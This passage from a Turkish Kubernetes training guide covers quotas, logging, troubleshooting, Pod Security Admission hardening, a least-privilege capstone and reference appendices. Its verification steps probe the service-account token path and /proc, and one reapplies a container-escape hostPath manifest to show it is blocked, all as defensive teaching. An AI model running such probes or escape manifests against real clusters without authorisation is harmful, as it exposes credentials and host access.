kubectl get pod oom-pod -o jsonpath='{.status.containerStatuses[0].lastState.terminated.reason}'; echo
# OOMKilled (Exit Code 137)

# QoS sınıflarını karşılaştır
kubectl get pod resource-pod oom-pod -o custom-columns=NAME:.metadata.name,QOS:.status.qosClass

# Temizlik
kubectl delete -f resource-pod.yaml
kubectl delete -f oom-pod.yaml
```

---

### Lab 3.5b — 🔐 ResourceQuota ve LimitRange (DoS / Cryptojacking Etki Alanını Sınırlama)

```bash
cd ~/k8s-lab/day3
kubectl create namespace quota-demo

cat > quota.yaml << 'EOF'
apiVersion: v1
kind: ResourceQuota
metadata:
  name: team-quota
  namespace: quota-demo
spec:
  hard:
    pods: "4"
    requests.cpu: "1"
    requests.memory: 1Gi
    limits.memory: 2Gi
---
apiVersion: v1
kind: LimitRange
metadata:
  name: default-limits
  namespace: quota-demo
spec:
  limits:
  - type: Container
    default:            # limit yazılmazsa bu uygulanır
      cpu: 200m
      memory: 256Mi
    defaultRequest:     # request yazılmazsa bu uygulanır
      cpu: 100m
      memory: 128Mi
    max:
      memory: 512Mi
EOF

kubectl apply -f quota.yaml

# 10 replica iste → quota sadece 4'üne izin verir
kubectl create deployment flood --image=nginx:1.25 --replicas=10 -n quota-demo
sleep 5
kubectl get pods -n quota-demo
kubectl describe quota team-quota -n quota-demo
kubectl get events -n quota-demo --field-selector reason=FailedCreate | tail -2
# ... exceeded quota: team-quota

# LimitRange: container başına üst sınır
kubectl run big -n quota-demo --image=nginx:1.25 \
  --overrides='{"spec":{"containers":[{"name":"big","image":"nginx:1.25","resources":{"limits":{"memory":"1Gi"}}}]}}'
# Error: maximum memory usage per Container is 512Mi

kubectl delete namespace quota-demo
```

> 🔐 Ele geçirilen bir hesap veya pod'un tüm cluster kaynaklarını tüketmesi (DoS, cryptomining) namespace bazında quota ile sınırlanır. Her ekip namespace'ine ResourceQuota + LimitRange koymak iyi bir başlangıçtır.

---

### Lab 3.6 — kubectl top ile İzleme

```bash
# Node kaynak kullanımı
kubectl top nodes

# Tüm pod'lar (tüm namespace)
kubectl top pods -A

# Belirli namespace
kubectl top pods -n kube-system

# Bir deployment oluştur, izle
kubectl create deployment monitor-demo --image=nginx:1.25 --replicas=3

# Pod kaynak kullanımı
kubectl top pods -l app=monitor-demo

# Namespace bazlı sırala
kubectl top pods -A --sort-by=cpu

# Temizlik
kubectl delete deployment monitor-demo
```

---

### Lab 3.7 — Log İnceleme

```bash
cd ~/k8s-lab/day3

# Çok container'lı Pod
cat > multi-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: multi-container
spec:
  containers:
  - name: app
    image: busybox:1.36
    command: ["sh", "-c", "while true; do echo app: $(date) log satiri; sleep 5; done"]
  - name: sidecar
    image: busybox:1.36
    command: ["sh", "-c", "while true; do echo sidecar: $(date) log satiri; sleep 3; done"]
EOF

kubectl apply -f multi-pod.yaml

# Tüm container'lar
kubectl logs multi-container --all-containers

# Belirli container
kubectl logs multi-container -c app
kubectl logs multi-container -c sidecar

# Canlı takip
kubectl logs -f multi-container -c app

# Son 5 satır
kubectl logs multi-container -c app --tail=5

# Crash öncesi loglar (--previous sadece yeniden başlatılan container'larda çalışır → restart=Always)
kubectl run crash-demo --image=busybox:1.36 --restart=Always -- /bin/sh -c "echo 'crash oncesi son log'; sleep 2; exit 1"
sleep 15
kubectl logs crash-demo --previous

# Uyarı event'leri (tüm namespace'ler, zaman sıralı)
kubectl get events -A --field-selector type=Warning --sort-by=.lastTimestamp | tail -10

# Temizlik
kubectl delete -f multi-pod.yaml
kubectl delete pod crash-demo
```

---

### Lab 3.8 — Troubleshooting Alıştırması

```bash
# Senaryo: Pod problemi teşhis et

# 1. Hatalı image
kubectl run trouble1 --image=nginx:badtag
kubectl get pod trouble1
# STATUS: ImagePullBackOff
kubectl describe pod trouble1
# Events bölümünde hatayı gör

# 2. Yetersiz kaynak (büyük request)
cat > trouble2.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: trouble2
spec:
  containers:
  - name: nginx
    image: nginx:1.25
    resources:
      requests:
        cpu: 100
        memory: 256Gi
EOF

kubectl apply -f trouble2.yaml
kubectl get pod trouble2
# STATUS: Pending
kubectl describe pod trouble2
# Events: FailedScheduling — insufficient resources

# 3. Çöken uygulama
kubectl run trouble3 --image=busybox:1.36 --restart=Always -- /bin/sh -c "echo 'config dosyasi bulunamadi'; exit 1"
sleep 10
kubectl get pod trouble3
# STATUS: CrashLoopBackOff
kubectl logs trouble3
kubectl describe pod trouble3

# Teşhis adımları:
# 1. kubectl get pods → status gör
# 2. kubectl describe pod <name> → events oku
# 3. kubectl logs <name> → uygulama logu
# 4. kubectl logs <name> --previous → crash öncesi

# Temizlik
kubectl delete pod trouble1 trouble3
kubectl delete -f trouble2.yaml
```

---

### Lab 3.9 — 🔐 Pod Güvenliği: securityContext ve Pod Security Admission

> **Pod Security Admission (PSA)**, namespace label'larıyla çalışan yerleşik admission controller'dır (PodSecurityPolicy 1.25'te kaldırıldı, yerini PSA aldı).
> - Seviyeler: `privileged` (kısıtsız) → `baseline` (bilinen yetki yükseltmelerini engeller: hostPath, hostPID, privileged...) → `restricted` (sıkılaştırılmış: non-root, drop ALL, seccomp...)
> - Modlar: `enforce` (reddet), `warn` (kullanıcıya uyar), `audit` (audit log'a yaz)

```bash
cd ~/k8s-lab/day3

# === 1) restricted namespace ===
kubectl create namespace psa-demo
kubectl label namespace psa-demo \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/warn=restricted \
  pod-security.kubernetes.io/audit=restricted

# Sıkılaştırılmamış pod → REDDEDİLİR
kubectl run root-nginx --image=nginx:1.25 -n psa-demo
# Error from server (Forbidden): ... violates PodSecurity "restricted:latest":
#   allowPrivilegeEscalation != false, unrestricted capabilities, runAsNonRoot != true, seccompProfile ...

# === 2) Sıkılaştırılmış pod → KABUL EDİLİR ===
cat > secure-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  namespace: psa-demo
spec:
  automountServiceAccountToken: false     # API'ye ihtiyacı yok → token yok
  securityContext:
    runAsNonRoot: true                     # root ile başlamayı reddet
    runAsUser: 10001
    seccompProfile:
      type: RuntimeDefault                 # tehlikeli syscall'ları filtrele
  containers:
  - name: app
    image: k8s-demo-app:v1
    imagePullPolicy: IfNotPresent
    ports:
    - containerPort: 5000
    securityContext:
      allowPrivilegeEscalation: false      # setuid ile yetki yükseltme yok
      readOnlyRootFilesystem: true         # dosya sistemine yazılamaz (zararlı dosya bırakılamaz)
      capabilities:
        drop: ["ALL"]                      # tüm Linux capability'leri kaldır
    resources:
      requests: {cpu: 50m, memory: 64Mi}
      limits: {cpu: 200m, memory: 128Mi}
EOF

kubectl apply -f secure-pod.yaml
kubectl wait --for=condition=Ready pod/secure-app -n psa-demo --timeout=60s

# Etkileri doğrula
kubectl exec -n psa-demo secure-app -- id                          # uid=10001
kubectl exec -n psa-demo secure-app -- touch /app/hack             # Read-only file system ✅
kubectl exec -n psa-demo secure-app -- ls /var/run/secrets/kubernetes.io/serviceaccount   # No such file ✅
kubectl exec -n psa-demo secure-app -- grep CapEff /proc/1/status  # 0000000000000000 ✅
kubectl exec -n psa-demo secure-app -- grep Seccomp: /proc/1/status   # 2 = filter aktif ✅

# === 3) Gün 2'deki hostPath saldırısını engelle ===
kubectl create namespace hostpath-demo --dry-run=client -o yaml | kubectl apply -f -
kubectl label namespace hostpath-demo pod-security.kubernetes.io/enforce=baseline --overwrite
kubectl apply -f ~/k8s-lab/day2/hostpath-escape.yaml
# Error from server (Forbidden): violates PodSecurity "baseline:latest": hostPath volumes ... ✅

# === 4) Mevcut cluster'ı denetle: restricted'a geçseydik hangi pod'lar ihlal ederdi? ===
kubectl label --dry-run=server --overwrite ns --all pod-security.kubernetes.io/enforce=restricted
# Hiçbir şey değişmez (dry-run); ihlal eden namespace/pod'lar uyarı olarak listelenir

# Temizlik
kubectl delete namespace psa-demo hostpath-demo
```

> 🔐 **Araç tanıtımı — eğitim sonrası için:**
>
> | Araç | Ne yapar? |
> |---|---|
> | **kube-bench** | Cluster'ı CIS Kubernetes Benchmark'a göre denetler |
> | **kubescape** | Yanlış yapılandırma taraması (NSA/CISA, MITRE ATT&CK çerçeveleri) |
> | **Trivy** (`trivy k8s`) | İmaj zafiyeti + cluster yapılandırma taraması |
> | **Kyverno / OPA Gatekeeper** | PSA'dan esnek politika motorları (ör. "sadece şirket registry'sinden imaj", "latest tag yasak") |
> | **Falco** | Runtime tespit: "container'da shell açıldı", "hassas dosya okundu" |

---

## 11. FİNAL SENARYOSU

### Uçtan Uca Görev: "Güvenli Bir Uygulamayı Canlıya Al" 


**Senaryo:** Şirketiniz `k8s-demo-app` uygulamasını Kubernetes'e taşıyor. Güvenlik ekibi olarak hem uygulamayı kurmanız hem de **en az yetki (least privilege)** ilkesine uygun olduğunu kanıtlamanız gerekiyor.

```bash
mkdir -p ~/k8s-lab/final && cd ~/k8s-lab/final
```

#### Görev 1 — Namespace ve Pod Security
- `final-project` namespace'ini oluşturun
- Pod Security label'ları: `enforce=baseline`, `warn=restricted`, `audit=restricted`
- Aktif context'in namespace'ini `final-project` yapın
> 💡 Lab 3.9 — `kubectl label namespace ...`

#### Görev 2 — Kimlik 
- `final-sa` ServiceAccount'u; token'ı **otomatik mount edilmesin**
> 💡 ServiceAccount YAML'ında `automountServiceAccountToken: false`

#### Görev 3 — Konfigürasyon, Sır ve Disk (5 dk)
- ConfigMap `app-config`: `APP_COLOR=lightyellow`
- Secret `app-secret`: `DB_PASSWORD=<kendi belirlediğiniz>`
- PVC `app-data`: 1Gi, ReadWriteOnce, `standard`
> 💡 Secret'ı `stringData:` ile yazarsanız base64'e çevirmeniz gerekmez

#### Görev 4 — Deployment 

`final-app` Deployment'ı şu gereksinimleri karşılamalı:

| Gereksinim | Değer |
|---|---|
| İmaj | `k8s-demo-app:v1`, `imagePullPolicy: IfNotPresent` |
| Replica / Strateji | 3 / RollingUpdate, `maxSurge: 1`, `maxUnavailable: 0` |
| Port | 5000 |
| Probe'lar | readiness + liveness → `GET /health` |
| Kaynak | requests `50m / 64Mi`, limits `200m / 128Mi` |
| Env | `APP_COLOR` ← ConfigMap |
| Secret | **env olarak DEĞİL**, `/etc/secrets/` altına salt-okunur **dosya** olarak |
| PVC | `/data` |
| ServiceAccount | `final-sa`, token mount yok |
| securityContext | `restricted` profiline uygun: runAsNonRoot, runAsUser 10001, fsGroup 10001, seccompProfile RuntimeDefault, allowPrivilegeEscalation false, readOnlyRootFilesystem true, capabilities drop ALL |

> ✅ Başarı kriteri: `kubectl apply` sırasında **hiç PodSecurity uyarısı çıkmamalı** (warn=restricted).
> 💡 Secret'ı dosya olarak mount ederken `defaultMode: 0440` kullanın (fsGroup sayesinde 10001 kullanıcısı okuyabilir).
> ❓ Neden env değil dosya? Env değişkenleri `exec`, alt process'ler, crash dump'lar ve hatalı loglama ile sızar; dosya olarak verilen Secret güncellenebilir ve erişimi dosya izinleriyle sınırlanabilir.

#### Görev 5 — Service + Ingress 
- ClusterIP Service `final-svc`: port 80 → targetPort 5000
- Ingress `final-ingress`: `ingressClassName: nginx`, host `final.local`, path `/` → `final-svc:80`
> 💡 Test: `kubectl port-forward -n ingress-nginx svc/ingress-nginx-controller 8081:80` ve `curl -H "Host: final.local" http://localhost:8081`

#### Görev 6 — Helm ile Yardımcı Servis 
- `podinfo/podinfo` chart'ını **`podinfo`** release adıyla, bir **values dosyası** ile kurun:
  - `ui.message`: kendi mesajınız
  - `redis.enabled: true`
  - `cache: tcp://podinfo-redis:6379`
- Kurulum sırasında çıkan PodSecurity **uyarılarını not edin** — neden kurulum yine de başarılı oldu?
> 💡 `kubectl get svc,pods --show-labels` ile Redis Service adını ve pod label'larını doğrulayın (NetworkPolicy için lazım olacak)

#### Görev 7 — NetworkPolicy: Sıfır Güven 
- Namespace'te varsayılan olarak **tüm ingress ve egress kapalı**
- Tüm pod'lar DNS'e (kube-system / kube-dns, 53 UDP+TCP) çıkabilir
- `final-app`'e **sadece `ingress-nginx` namespace'inden** 5000/TCP gelebilir
- `podinfo` → `podinfo-redis` 6379/TCP izinli (egress + ingress)
- Hiçbir pod internete çıkamaz
> 💡 Her namespace'in otomatik label'ı: `kubernetes.io/metadata.name: <ad>`

#### Görev 8 — RBAC: Operatör Rolü 
- `dev-team` grubu için `final-operator` Role + RoleBinding:
  - pod, pod log, service, configmap, event, pvc: **okuma**
  - deployment, replicaset: okuma; deployment: **patch/update** (rollout için)
  - **secrets YOK, pods/exec YOK, pods/portforward YOK**
> 💡 Lab 2.10b — `subjects: - kind: Group`

#### Görev 9 — Güncelleme ve Hatalı Sürümden Dönüş 
- `v2`'ye güncelleyin, `change-cause` ekleyin
- `v3-bad`'e güncelleyin → rollout'un takıldığını **ve kullanıcıların etkilenmediğini** gösterin
- Rollback yapın (son durum: v2)

#### Görev 10 — Güvenlik Denetimi: Kanıtlayın 
Aşağıdaki doğrulama komutlarını çalıştırın — **tüm beklenen sonuçları** almalısınız.

### Doğrulama Komutları

```bash
# 1) Uygulama Ingress üzerinden çalışıyor
kubectl port-forward -n ingress-nginx svc/ingress-nginx-controller 8081:80 >/dev/null &
sleep 3
curl -s -H "Host: final.local" http://localhost:8081 | grep -o "Version: [^<]*"
kill %1
# Beklenen: Version: 2.0

# 2) Pod sıkılaştırılmış
POD=$(kubectl get pod -l app=final-app -o jsonpath='{.items[0].metadata.name}')
kubectl exec $POD -- id                                                  # uid=10001
kubectl exec $POD -- touch /app/x                                        # Read-only file system
kubectl exec $POD -- ls /var/run/secrets/kubernetes.io/serviceaccount    # No such file or directory
kubectl exec $POD -- cat /etc/secrets/DB_PASSWORD; echo                  # şifreniz
kubectl exec $POD -- sh -c 'env | grep -c DB_PASSWORD'                   # 0

# 3) Başka namespace'ten erişim engelli
kubectl run outsider -n default --rm -i --restart=Never --image=nicolaka/netshoot:v0.13 -- \
  curl -s -o /dev/null -w "%{http_code}\n" --max-time 3 http://final-svc.final-project
# Beklenen: 000

# 4) Uygulama internete çıkamıyor
kubectl exec $POD -- python -c "import urllib.request as u; u.urlopen('https://example.com', timeout=3)" 2>&1 | tail -1
# Beklenen: timeout / bağlantı hatası

# 5) podinfo → Redis çalışıyor (cache API)
kubectl exec deploy/podinfo -- curl -s -X POST -d 'merhaba-redis' localhost:9898/cache/test
kubectl exec deploy/podinfo -- curl -s localhost:9898/cache/test; echo
# Beklenen: merhaba-redis

# 6) RBAC
kubectl auth can-i patch deployments  --as=ops --as-group=dev-team -n final-project   # yes
kubectl auth can-i get secrets        --as=ops --as-group=dev-team -n final-project   # no
kubectl auth can-i create pods/exec   --as=ops --as-group=dev-team -n final-project   # no
kubectl auth can-i --list --as=system:serviceaccount:final-project:final-sa -n final-project
# final-sa'ya hiçbir uygulama yetkisi verilmedi

# 7) Rollout geçmişi
kubectl rollout history deployment/final-app

# 8) Helm
helm list
helm get values podinfo
```

> 🤔 **Tartışma sorusu:** `final-operator` rolüne verdiğimiz `deployments: patch` yetkisi ile bir operatör, pod şablonundaki imajı veya ServiceAccount'u değiştirebilir mi? Bu, Lab 2.10c'deki "dolaylı yetki" ile nasıl ilişkili? Üretimde bu riski nasıl azaltırsınız? (GitOps, admission policy, imaj imzalama...)

### Temizlik

```bash
helm uninstall podinfo -n final-project
kubectl config set-context --current --namespace=default
kubectl delete namespace final-project
```

---

## 12. GÜNLÜK TEMİZLİK

> Her gün kendi namespace'imizde (`gun1`, `gun2`, `gun3`) çalıştığımız için temizlik namespace silmekten ibarettir. ⚠️ `default` namespace'inde `kubectl delete svc --all` gibi komutlar çalıştırmayın — `kubernetes` Service'i gibi sistem kaynaklarını da siler.

### Gün 1 Sonu
```bash
kubectl config set-context --current --namespace=default
kubectl delete namespace gun1 egitim my-lab --ignore-not-found
kubectl get ns
# Not: Docker imajlarını (k8s-demo-app:*) silmeyin — Gün 3'te kullanılacak
```

### Gün 2 Sonu
```bash
kubectl config set-context --current --namespace=default
kubectl delete namespace gun2 netpol-demo rbac-demo day2-lab ctf --ignore-not-found
kubectl get pv            # Released durumda PV kaldıysa: kubectl delete pv <ad>
# Not: ~/k8s-lab/day2/hostpath-escape.yaml dosyasını saklayın — Gün 3 Lab 3.9'da kullanılacak
```

### Gün 3 Sonu
```bash
helm list -A              # kalan release varsa: helm uninstall <ad> -n <namespace>
kubectl config set-context --current --namespace=default
kubectl delete namespace gun3 bluegreen quota-demo psa-demo hostpath-demo final-project --ignore-not-found
kubectl get ns

# Minikube'ü durdur
minikube stop
# Eğitim bittiğinde tüm cluster'ı silmek için (opsiyonel): minikube delete
# Codespaces kullanıyorsanız: github.com/codespaces → codespace'i silin (kota tüketmesin)
```

---

## EK: Hızlı Referans Kartı


### Pod & Deployment
```bash
kubectl run <name> --image=<image>          # Pod oluştur
kubectl create deploy <name> --image=<img>  # Deployment oluştur
kubectl get pods                             # Pod listesi
kubectl get deploy                           # Deployment listesi
kubectl describe pod <name>                  # Detaylı bilgi
kubectl logs <name>                          # Loglar
kubectl exec -it <name> -- bash              # Pod içine gir
kubectl delete pod <name>                    # Pod sil
kubectl scale deploy <name> --replicas=N     # Scale
kubectl set image deploy/<name> <c>=<img>    # Image güncelle
kubectl rollout status deploy/<name>        # Rollout durumu
kubectl rollout undo deploy/<name>          # Rollback
```

### Context & Namespace
```bash
kubectl config current-context               # Aktif context'i göster
kubectl config get-contexts                  # Tüm context'leri listele
kubectl config use-context <name>            # Başka context'e geç
kubectl config set-context --current --namespace=<ns>  # Namespace değiştir
kubectl config view --minify                 # Aktif config'i göster
kubectl get namespaces                       # Namespace listesi
kubectl create namespace <name>              # Namespace oluştur
```

### Service & Network
```bash
kubectl expose deploy <name> --port=80       # Service oluştur
kubectl get svc                              # Service listesi
kubectl get endpoints <name>                 # Endpoint'ler
kubectl get networkpolicy                     # NetworkPolicy listesi
```

### Storage & Config
```bash
kubectl get pv                               # PV listesi
kubectl get pvc                              # PVC listesi
kubectl get configmap                         # ConfigMap listesi
kubectl get secret                            # Secret listesi
```

### RBAC
```bash
kubectl get role                              # Role listesi
kubectl get rolebinding                       # RoleBinding listesi
kubectl get sa                                # ServiceAccount listesi
kubectl auth can-i <verb> <resource>          # Yetki kontrolü
```

### Helm
```bash
helm repo add <name> <url>                   # Repo ekle
helm repo update                              # Repo güncelle
helm search repo <keyword>                    # Chart ara
helm install <name> <chart>                   # Kur
helm upgrade <name> <chart>                   # Güncelle
helm rollback <name> <revision>                # Geri al
helm list                                     # Yüklü release'ler
helm uninstall <name>                         # Sil
```

### İzleme
```bash
kubectl top nodes                             # Node kaynakları
kubectl top pods                              # Pod kaynakları
kubectl logs <name> -f                        # Canlı log
kubectl logs <name> --previous                # Crash öncesi log
kubectl describe pod <name>                   # Event'ler ve hata analizi
```

### 🔐 Güvenlik Denetimi
```bash
kubectl auth can-i --list --as=<kullanıcı> -n <ns>               # bir kimlik neler yapabilir?
kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa> -n <ns>
kubectl get rolebinding,clusterrolebinding -A -o wide | grep <ad> # kime ne bağlanmış?
kubectl get networkpolicy -A                                     # policy'siz namespace var mı?
kubectl get ns -L pod-security.kubernetes.io/enforce             # namespace PSA seviyeleri
kubectl label --dry-run=server --overwrite ns --all pod-security.kubernetes.io/enforce=restricted
kubectl get csr                                                  # bekleyen sertifika istekleri
kubectl get secrets -A -l owner=helm                             # Helm release sırları
```

---

## EK: Lens

### Kubernetes GUI Aracı — Kurulum ve Kullanım

#### Lens Nedir?

- Kubernetes cluster'larını görsel olarak yöneten masaüstü uygulaması (**ticari ürün**: kişisel kullanım ücretsiz, Lens ID hesabı ister; kurumsal kullanım lisansa tabi)
- **Açık kaynak alternatifler:** **Headlamp** (CNCF projesi, masaüstü/web) ve **k9s** (terminal tabanlı, çok hızlı)
- 🔐 GUI araçları kubeconfig'inizin **tüm yetkileriyle** çalışır; hesap/telemetri gereksinimlerini kurum politikanızla kontrol edin
- `kubectl` komutlarının grafik arayüze taşınmış hali gibi düşünün
- Pod, Deployment, Service, PVC, RBAC tüm kaynakları görsel görüntüleme
- Yerleşik log görüntüleyici, terminal (exec), resource grafikleri
- Windows, macOS, Linux'ta çalışır

#### Kurulum

**Windows:**
```text
https://k8slens.dev/ adresinden indirip Windows'a kurun (WSL2'nin içine değil).
WSL2'deki cluster'ı eklemek için kubeconfig yolu:
  \\wsl$\Ubuntu-24.04\home\<kullanıcı>\.kube\config
Bağlantı kurulamazsa k9s'i WSL2 içinde kullanın.
```

**k9s (tüm platformlar, terminal):**
```bash
# macOS
brew install k9s
# Linux / WSL2: https://github.com/derailed/k9s/releases adresinden k9s_Linux_amd64.tar.gz indirip
# içindeki k9s dosyasını /usr/local/bin/ altına kopyalayın
k9s
```

**macOS:**
```bash
brew install --cask lens
```

**Linux (Ubuntu/Debian):**
```bash
# .deb paketini indir
wget https://github.com/lensapp/lens/releases/latest/download/Lens-7.x.x.amd64.deb
sudo dpkg -i Lens-*.deb
```

#### Minikube Cluster'ı Lens'e Bağlama

1. Lens'i aç
2. Sol alt köşede "File → Add Cluster" (veya `+` butonu)
3. `~/.kube/config` dosyasını seç — minikube çalışıyorsa otomatik oluşturulur
4. "Add clusters" butonuna tıkla
5. Cluster listede görünür — tıkla ve bağlan

```bash
# kubeconfig dosyasının var olduğunu doğrula
cat ~/.kube/config

# Gerekirse minikube kubeconfig yeniden oluştur
minikube update-context
```

#### Lens'te Neler Yapılabilir?

| Özellik | Açıklama |
|---|---|
| **Pod Listesi** | Tüm pod'ları, durumlarını gör |
| **Log Viewer** | Pod loglarını renklendirilmiş gör, filtrele |
| **Terminal** | Pod içine grafik arayüzden terminal aç |
| **YAML Edit** | Kaynakları görsel olarak düzenle |
| **Resource Metrics** | CPU/Memory grafikleri (Metrics Server gerekir) |
| **Port Forward** | Pod portlarını local'e forward et |
| **Multi-Cluster** | Birden fazla cluster'ı tek ekrandan yönet |
| **Helm Releases** | Yüklü Helm release'lerini gör |

#### Hızlı İnceleme (Eğitim sonrası deneme için)

```bash
# Önce birkaç kaynak oluştur
kubectl create deployment lens-demo --image=nginx:1.25 --replicas=3
kubectl expose deployment lens-demo --port=80 --type=NodePort

# Lens'i aç ve incele:
# 1. Sol panelde "default" namespace → Deployments → lens-demo
# 2. Pod'lara tıkla — durum, log, terminal
# 3. Pod içine terminal aç (sağ üst "Terminal" butonu)
# 4. Service lens-demo'ya tıkla — endpoint'ler
# 5. Resource metrics sekmesi (Metrics Server gerekir)

# Temizlik
kubectl delete deployment lens-demo
kubectl delete svc lens-demo
```

#### Lens vs kubectl

| Özellik | kubectl | Lens |
|---|---|---|
| Erişim | Terminal | GUI |
| Çok cluster | kubeconfig switch | Tek ekranda |
| Log görme | `kubectl logs` | Renkli, scroll, filter |
| Pod içine gir | `kubectl exec` | Butonla terminal |
| YAML edit | `kubectl edit` | Görsel editor |
| Scripting/Otomasyon | Uygun | Değil |
| Öğrenme | Dik eğri | Sezgisel |

---

## EK: Troubleshooting

### Yaygın Sorunlar ve Teşhis Komutları

---

#### Senaryo 1: Pod Pending — Zamanlanamıyor

```bash
# Belirti: kubectl get pods → STATUS: Pending

# Event'leri gör (neden zamanlanmadığını söyler)
kubectl describe pod <pod-name> | tail -20

# Yaygın nedenler:
# "insufficient cpu/memory" → resource requests çok yüksek
# "node(s) didn't match node selector" → label uyuşmuyor
# "persistentvolumeclaim not found" → PVC Pending

# Teşhis:
kubectl get nodes -o wide           # Node kaynakları
kubectl describe node <node-name>   # Node'da ne kadar kaynak var?
kubectl get pvc                     # PVC Pending mi?
```

---

#### Senaryo 2: Pod ImagePullBackOff

```bash
# Belirti: kubectl get pods → STATUS: ImagePullBackOff

# Hata detayı
kubectl describe pod <pod-name> | grep -A 3 "Failed"

# Yaygın nedenler:
# - Yanlış image adı/tag
# - Private registry (imagePullSecrets gerekiyor)
# - Internet/proxy problemi

# Teşhis:
kubectl get pod <pod-name> -o jsonpath='{.spec.containers[*].image}'
docker pull <image-name>    # Manuel pull dene
```

---

#### Senaryo 3: Pod CrashLoopBackOff

```bash
# Belirti: kubectl get pods → STATUS: CrashLoopBackOff (sürekli çöküyor)

# 1. Uygulama logları
kubectl logs <pod-name>
kubectl logs <pod-name> --previous    # ÇÖKME öncesi loglar — EN ÖNEMLİSİ

# 2. Çıkış kodu
kubectl describe pod <pod-name> | grep -A 5 "Last State"
# Exit Code 1 → uygulama hatası
# OOMKilled → memory limit aşımı

# Yaygın nedenler:
# - Uygulama kod hatası → logları oku
# - Eksik environment variable → kubectl describe'da env kontrol et
# - Liveness probe çok agresif → initialDelaySeconds artır
# - Memory limit çok düşük → limit artır
```

---

#### Senaryo 4: Pod OOMKilled (Memory Limit Aşımı)

```bash
# Belirti: Pod öldürülüyor, Last State = OOMKilled

# Teşhis
kubectl get pod <pod-name> -o jsonpath='{.status.containerStatuses[0].lastState}'
# "OOMKilled" görürsün

# Memory kullanımı (Metrics Server gerekir)
kubectl top pod <pod-name>

# Çözüm:
# Memory limit artır
kubectl set resources deployment/<name> --limits=memory=512Mi
# Veya YAML'de limits.memory değerini artırıp kubectl apply
```

---

#### Senaryo 5: Service'in Endpoint'leri Boş

```bash
# Belirti: Service var ama erişilemiyor

# Endpoint'leri kontrol et
kubectl get endpoints <service-name>
# Boş ise → Service hiçbir Pod'a bağlanmıyor

# 1. Selector uyuşuyor mu?
kubectl get pods --show-labels | grep <app-name>
kubectl get svc <service-name> -o jsonpath='{.spec.selector}'
# Pod label'ları ile Service selector'ı eşleşmeli

# 2. Pod'lar Ready mi?
kubectl get pods -l <selector>
# STATUS != Running/Ready → endpoint'e girmez

# 3. Port uyuşuyor mu?
kubectl get svc <service-name> -o jsonpath='{.spec.ports[*].targetPort}'
kubectl get pod -l <selector> -o jsonpath='{.items[0].spec.containers[*].ports[*].containerPort}'
# targetPort ile containerPort eşleşmeli
```

---

#### Senaryo 6: Pod Service'e Erişemiyor (Ağ/DNS)

```bash
# Belirti: curl http://<service> timeout veya connection refused

# 1. DNS çözümleme çalışıyor mu?
kubectl exec -it <pod> -- nslookup <service-name>
# Çözümlenmiyorsa → CoreDNS problemi

# 2. CoreDNS çalışıyor mu?
kubectl get pods -n kube-system -l k8s-app=kube-dns
# Ready değilse → CoreDNS loglarına bak
kubectl logs -n kube-system $(kubectl get pod -n kube-system -l k8s-app=kube-dns -o jsonpath='{.items[0].metadata.name}')

# 3. Service IP'ye direkt erişim
kubectl exec -it <pod> -- curl -s --max-time 3 http://<service-cluster-ip>

# 4. Endpoint'ler var mı?
kubectl get endpoints <service-name>

# 5. NetworkPolicy engelliyor mu?
kubectl get networkpolicy -A
# Policy varsa → geçici sil ve test et

# 6. resolv.conf kontrol
kubectl exec -it <pod> -- cat /etc/resolv.conf
# nameserver CoreDNS IP olmalı (genelde 10.96.0.10)
```

---

#### Senaryo 7: PVC Pending (Depolama Sorunu)

```bash
# Belirti: kubectl get pvc → STATUS: Pending

# Nedenini gör
kubectl describe pvc <pvc-name> | tail -10

# StorageClass var mı?
kubectl get storageclass

# PV oluşturuldu mu?
kubectl get pv

# Yaygın nedenler:
# - StorageClass adı yanlış yazılmış
# - Dinamik provisioning desteklenmiyor (statik PV gerekir)
# - Yeterli disk alanı yok
```

---

#### Senaryo 8: Node NotReady

```bash
# Belirti: kubectl get nodes → STATUS: NotReady

# Node detayları
kubectl describe node <node-name> | tail -20

# Conditions kontrol et
kubectl describe node <node-name> | grep -A 2 Conditions
# DiskPressure → disk dolu
# MemoryPressure → memory dolu
# PIDPressure → çok fazla process

# Çözüm:
# Node'a SSH ile gir
systemctl status kubelet         # kubelet çalışıyor mu?
docker system prune -f            # disk temizle
sudo reboot                       # son çare
```

#### Troubleshooting Komutları Özeti

```bash
# === KADESELELİ TEŞHİS AKIŞI ===

# 1. Cluster sağlığı
kubectl get nodes
kubectl get pods -A

# 2. Pod problemi
kubectl describe pod <pod-name>           # Events bölümü — ALTIN MADENİ
kubectl logs <pod-name>                    # Uygulama logu
kubectl logs <pod-name> --previous          # Crash öncesi log
kubectl get pod <pod-name> -o wide         # IP, node bilgisi

# 3. Service problemi
kubectl get svc <name>
kubectl get endpoints <name>               # Boşsa selector problemi

# 4. Events (zaman sıralı)
kubectl get events -n <namespace> --sort-by='.lastTimestamp'

# 5. Resource kullanımı
kubectl top nodes
kubectl top pods -n <namespace>

# 6. Ağ problemi
kubectl exec -it <pod> -- nslookup <svc>   # DNS testi
kubectl exec -it <pod> -- curl <svc>        # Erişim testi
kubectl get networkpolicy -A                # Policy kontrolü

# 7. Storage problemi
kubectl get pvc                             # Pending mi?
kubectl get pv                              # PV oluşturuldu mu?
kubectl get storageclass                    # StorageClass var mı?

# 8. Rollback (son çare)
kubectl rollout undo deployment/<name>      # Önceki sürüme dön
```

---

*Bu kılavuz katılımcıların eğitim boyunca takip etmesi için hazırlanmıştır. Tüm komutlar bash ortamında çalışır: Linux, macOS, WSL2 Ubuntu, Git Bash (Yol C) ve GitHub Codespaces (Yol D).*
